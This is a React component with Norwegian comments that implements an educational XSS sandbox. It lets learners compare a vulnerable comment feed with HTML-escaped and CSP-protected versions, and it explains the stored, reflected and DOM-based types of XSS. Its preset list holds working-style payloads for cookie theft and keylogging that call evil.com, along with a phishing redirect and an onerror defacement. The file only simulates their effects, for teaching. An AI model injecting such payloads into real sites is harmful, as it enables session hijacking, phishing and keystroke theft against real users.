import { useMemo, useState } from "react";
import {
  Shield,
  ShieldAlert,
  ShieldCheck,
  Cookie,
  ExternalLink,
  Keyboard,
  AlertTriangle,
} from "lucide-react";

// ---------------------------------------------------------------------------
// XssSandbox — interaktiv simulator for Cross-Site Scripting.
//
// Modus (samme bryt-mønster som SharedMemorySim):
//   vulnerable  → kommentar settes inn med dangerouslySetInnerHTML; <script>
//                 og hendelses-handlers "kjører" (simulert) i offerets browser
//   escaped     → samme input vises som tekst (innerText)
//   csp         → escaped + Content-Security-Policy: script-src 'self' blokkerer
//                 inline scripts selv om noen skulle slippe gjennom escapingen
//
// XSS-typer (klassifikasjon):
//   stored      → payload ligger lagret i DB (kommentar-feed, profil-bio)
//   reflected   → payload ligger i URL-parameter (search?q=...)
//   dom-based   → payload manipulerer DOM via document.write / innerHTML
//
// Lærepunkt: escaping på OUTPUT er forsvaret. Aldri "filtrer farlige tegn".
// ---------------------------------------------------------------------------

type Mode = "vulnerable" | "escaped" | "csp";

type StoredComment = {
  id: number;
  author: string;
  raw: string;          // det brukeren skrev (kan inneholde <script>)
  payloadKind: PayloadKind | "none";
};

type PayloadKind = "cookie" | "redirect" | "keylog" | "deface";

const PRESETS: { id: PayloadKind; label: string; icon: typeof Cookie; payload: string; effect: string }[] = [
  {
    id: "cookie",
    label: "Steal session cookie",
    icon: Cookie,
    payload: `<script>fetch("https://evil.com/steal?c="+document.cookie)</script>`,
    effect: `POST evil.com/steal?c=session=abc123-USER-ADMIN`,
  },
  {
    id: "redirect",
    label: "Redirect to phishing",
    icon: ExternalLink,
    payload: `<script>location.href="https://bank-l0gin.evil.com"</script>`,
    effect: `window.location -> bank-l0gin.evil.com (looks like real bank)`,
  },
  {
    id: "keylog",
    label: "Keylog tastetrykk",
    icon: Keyboard,
    payload: `<script>document.onkeypress=e=>fetch("//evil.com/k?"+e.key)</script>`,
    effect: `Hvert tegn -> evil.com/k?a, /k?d, /k?m, /k?i, /k?n, ...`,
  },
  {
    id: "deface",
    label: "Deface side",
    icon: AlertTriangle,
    payload: `<img src=x onerror="document.body.style.background='red'">`,
    effect: `Bakgrunn blir rød. onerror=... kjøres når src=x feiler.`,
  },
];

const STARTING_THREAD: StoredComment[] = [
  { id: 1, author: "Ola", raw: "Bra innlegg!", payloadKind: "none" },
  { id: 2, author: "Kari", raw: "Enig, lærte mye av dette.", payloadKind: "none" },
];

// Klassifiser en payload som stored/reflected/dom — vi kaller stored som default
// fordi kommentaren lagres i "DB" (state). De andre typene forklares i sidebar.
function classifyPayload(raw: string): PayloadKind | "none" {
  if (raw.includes("document.cookie")) return "cookie";
  if (raw.includes("location.href") || raw.includes("location.replace")) return "redirect";
  if (raw.includes("onkeypress") || raw.includes("onkeydown")) return "keylog";
  if (raw.includes("<script") || raw.includes("onerror") || raw.includes("onload"))
    return "deface";
  return "none";
}

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

export function XssSandbox() {
  const [mode, setMode] = useState<Mode>("vulnerable");
  const [draft, setDraft] = useState<string>("");
  const [thread, setThread] = useState<StoredComment[]>(STARTING_THREAD);
  const [log, setLog] = useState<{ t: number; text: string; tone: "info" | "bad" | "good" }[]>([]);

  const pushLog = (text: string, tone: "info" | "bad" | "good" = "info") => {
    setLog((L) => [{ t: Date.now(), text, tone }, ...L].slice(0, 14));
  };

  const post = () => {
    if (!draft.trim()) return;
    const kind = classifyPayload(draft);
    const newComment: StoredComment = {
      id: thread.length + 1,
      author: "Du",
      raw: draft,
      payloadKind: kind,
    };
    setThread((T) => [...T, newComment]);

    // Simuler hva som skjer når en ANNEN bruker åpner siden
    if (kind !== "none") {
      if (mode === "vulnerable") {
        const preset = PRESETS.find((p) => p.id === kind);
        pushLog(`Offer åpner siden — payload kjører i deres browser`, "bad");
        if (preset) pushLog(preset.effect, "bad");
      } else if (mode === "escaped") {
        pushLog(`Offer åpner siden — HTML escapet, payload vises som tekst`, "good");
      } else {
        pushLog(`Offer åpner siden — CSP blokkerer inline script-eksekvering`, "good");
        pushLog(
          `[Browser-konsoll] Refused to execute inline script (CSP: script-src 'self')`,
          "info",
        );
      }
    } else {
      pushLog(`Kommentar publisert (ingen payload oppdaget i input)`, "info");
    }
    setDraft("");
  };

  const applyPreset = (id: PayloadKind) => {
    const p = PRESETS.find((x) => x.id === id);
    if (p) setDraft(p.payload);
  };

  const reset = () => {
    setThread(STARTING_THREAD);
    setLog([]);
    setDraft("");
  };

  // Render mode info
  const modeInfo = {
    vulnerable: {
      icon: ShieldAlert,
      color: "text-destructive",
      bg: "bg-destructive/10",
      border: "border-destructive/40",
      label: "Sårbar",
      desc: "Server skriver kommentaren rett inn i HTML med dangerouslySetInnerHTML / Jinja2 |safe. Script kjører som om det var en del av sidens egen kode.",
    },
    escaped: {
      icon: ShieldCheck,
      color: "text-success",
      bg: "bg-success/10",
      border: "border-success/40",
      label: "Escaped (output encoding)",
      desc: "Server bytter < til &lt; og > til &gt; før HTML-en sendes. Browseren ser nå bare tekst, ikke tagger — uansett hva brukeren skrev.",
    },
    csp: {
      icon: Shield,
      color: "text-blue-600 dark:text-blue-400",
      bg: "bg-blue-500/10",
      border: "border-blue-500/40",
      label: "Escaped + CSP",
      desc: "Belt-and-braces. Selv om noen glemmer å escape i én Jinja-template, blokkerer Content-Security-Policy-headeren inline scripts. Defense in depth.",
    },
  }[mode];

  return (
    <div className="rounded-xl border border-border bg-card overflow-hidden">
      {/* Header */}
      <div className={`px-5 py-3 border-b border-border ${modeInfo.bg}`}>
        <div className="flex items-center justify-between gap-3 flex-wrap">
          <div className="flex items-center gap-2">
            <modeInfo.icon className={`h-5 w-5 ${modeInfo.color}`} />
            <h3 className={`font-semibold ${modeInfo.color}`}>
              XSS-sandbox — modus: {modeInfo.label}
            </h3>
          </div>
          <div className="flex gap-1.5">
            {(["vulnerable", "escaped", "csp"] as Mode[]).map((m) => (
              <button
                key={m}
                onClick={() => setMode(m)}
                className={`px-3 py-1 rounded text-xs font-medium border transition-colors ${
                  mode === m
                    ? "bg-foreground text-background border-foreground"
                    : "bg-background border-border hover:bg-muted"
                }`}
              >
                {m === "vulnerable" ? "Sårbar" : m === "escaped" ? "Escapet" : "Escapet + CSP"}
              </button>
            ))}
          </div>
        </div>
        <p className="text-xs text-muted-foreground mt-2">{modeInfo.desc}</p>
      </div>

      <div className="grid lg:grid-cols-2 gap-0 divide-x divide-border">
        {/* Venstre: form + presets */}
        <div className="p-5">
          <div className="text-xs uppercase tracking-wider text-muted-foreground font-semibold mb-2">
            Skriv en kommentar
          </div>
          <textarea
            value={draft}
            onChange={(e) => setDraft(e.target.value)}
            rows={4}
            placeholder="Skriv noe — eller velg et angreps-preset under"
            className="w-full font-mono text-xs rounded border border-border bg-background p-2 focus:outline-none focus:ring-2 focus:ring-brand/40"
          />
          <div className="flex flex-wrap gap-2 mt-3">
            <button
              onClick={post}
              className="px-3 py-1.5 rounded text-xs font-medium bg-brand text-brand-foreground hover:bg-brand/90"
            >
              Publiser kommentar
            </button>
            <button
              onClick={reset}
              className="px-3 py-1.5 rounded text-xs font-medium border border-border hover:bg-muted"
            >
              Nullstill
            </button>
          </div>

          <div className="mt-4">
            <div className="text-xs uppercase tracking-wider text-muted-foreground font-semibold mb-2">
              Angreps-presets
            </div>
            <div className="grid sm:grid-cols-2 gap-2">
              {PRESETS.map((p) => (
                <button
                  key={p.id}
                  onClick={() => applyPreset(p.id)}
                  className="text-left rounded border border-destructive/30 bg-destructive/5 hover:bg-destructive/10 p-2.5"
                >
                  <div className="flex items-center gap-1.5 mb-1">
                    <p.icon className="h-3.5 w-3.5 text-destructive" />
                    <span className="text-xs font-medium text-destructive">{p.label}</span>
                  </div>
                  <code className="block text-[10px] font-mono text-muted-foreground whitespace-pre-wrap break-all">
                    {p.payload}
                  </code>
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Høyre: kommentar-tråd + simulator-logg */}
        <div className="p-5 bg-muted/20">
          <div className="text-xs uppercase tracking-wider text-muted-foreground font-semibold mb-2">
            Kommentar-tråd (slik andre brukere ser det)
          </div>
          <div className="space-y-2 mb-4">
            {thread.map((c) => (
              <CommentRender key={c.id} comment={c} mode={mode} />
            ))}
          </div>

          <div className="text-xs uppercase tracking-wider text-muted-foreground font-semibold mb-2">
            Simulator-logg
          </div>
          <div className="rounded border border-border bg-background p-3 max-h-44 overflow-y-auto">
            {log.length === 0 ? (
              <div className="text-xs text-muted-foreground italic">
                Publiser en kommentar for å se hva som skjer i offerets browser.
              </div>
            ) : (
              <ul className="space-y-1 font-mono text-[11px]">
                {log.map((l) => (
                  <li
                    key={l.t}
                    className={
                      l.tone === "bad"
                        ? "text-destructive"
                        : l.tone === "good"
                        ? "text-success"
                        : "text-muted-foreground"
                    }
                  >
                    {l.text}
                  </li>
                ))}
              </ul>
            )}
          </div>
        </div>
      </div>

      {/* XSS-typer */}
      <div className="px-5 py-4 border-t border-border bg-background">
        <div className="text-xs uppercase tracking-wider text-muted-foreground font-semibold mb-2">
          Tre typer XSS
        </div>
        <div className="grid sm:grid-cols-3 gap-3 text-xs">
          <div className="rounded border border-border p-3">
            <div className="font-semibold text-foreground mb-1">Stored</div>
            <div className="text-muted-foreground">
              Payload lagres på server (DB). Hver bruker som leser kommentaren blir
              rammet. Verst — én angriper, mange ofre.
            </div>
          </div>
          <div className="rounded border border-border p-3">
            <div className="font-semibold text-foreground mb-1">Reflected</div>
            <div className="text-muted-foreground">
              Payload ligger i URL (<code>?q=&lt;script&gt;...</code>) og server
              speiler den uten escape. Krever at offer klikker preparert lenke.
            </div>
          </div>
          <div className="rounded border border-border p-3">
            <div className="font-semibold text-foreground mb-1">DOM-based</div>
            <div className="text-muted-foreground">
              Serveren ser aldri payload — det er ren klient-side JS som tar
              <code>location.hash</code> og putter inn med <code>innerHTML</code>.
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

function CommentRender({ comment, mode }: { comment: StoredComment; mode: Mode }) {
  // I sårbar modus: rendrer "som om" server slapp det gjennom. Vi gjør IKKE
  // ekte innerHTML-eksekvering — vi simulerer ved å markere payloaden visuelt
  // som rød "kjørbar kode" og vise effekten i loggen. Det er trygt i en
  // pedagogisk sandbox uten å gi browseren faktisk script-tilgang.
  const showAsExecuted = useMemo(() => {
    return mode === "vulnerable" && comment.payloadKind !== "none";
  }, [mode, comment.payloadKind]);

  const escaped = escapeHtml(comment.raw);

  return (
    <div className="rounded border border-border bg-background p-2.5">
      <div className="flex items-center justify-between gap-2 mb-1">
        <span className="text-xs font-medium text-foreground">{comment.author}</span>
        {showAsExecuted && (
          <span className="text-[9px] uppercase tracking-wider text-destructive font-bold">
            payload kjørte
          </span>
        )}
      </div>
      {mode === "vulnerable" ? (
        showAsExecuted ? (
          <div className="rounded bg-destructive/10 border border-destructive/30 p-1.5">
            <code className="text-[11px] font-mono text-destructive whitespace-pre-wrap break-all">
              {comment.raw}
            </code>
            <div className="text-[10px] text-destructive/80 mt-1 italic">
              ↑ browseren tolket dette som HTML/JS og kjørte det
            </div>
          </div>
        ) : (
          <span className="text-sm text-foreground">{comment.raw}</span>
        )
      ) : (
        // Escapet eller CSP: vis som tekst — viktig at vi viser den ESCAPEDE
        // formen for å gjøre poenget klart at < ble til &lt;.
        <div>
          <span className="text-sm text-foreground">{comment.raw}</span>
          {comment.payloadKind !== "none" && (
            <div className="mt-1.5 rounded bg-success/5 border border-success/30 p-1.5">
              <div className="text-[9px] uppercase tracking-wider text-success font-bold mb-1">
                Slik blir det sendt til browser
              </div>
              <code className="text-[10px] font-mono text-muted-foreground break-all">
                {escaped}
              </code>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
